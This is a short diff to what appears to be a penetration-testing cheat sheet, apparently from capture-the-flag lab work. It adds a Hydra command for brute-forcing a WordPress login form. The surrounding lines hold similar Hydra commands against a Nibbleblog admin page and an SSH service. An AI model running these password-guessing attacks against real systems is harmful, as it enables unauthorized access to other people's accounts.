@@ -5,6 +5,8 @@ http-post-form:
 
 `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.26.24 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password"`
 
+`hydra -L fsocity.dic -p testing $ip http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"`
+
 ssh:
 
 `hydra -l sunny -P ~/SecLists/rockyou.txt -s <port> ssh://$ip`
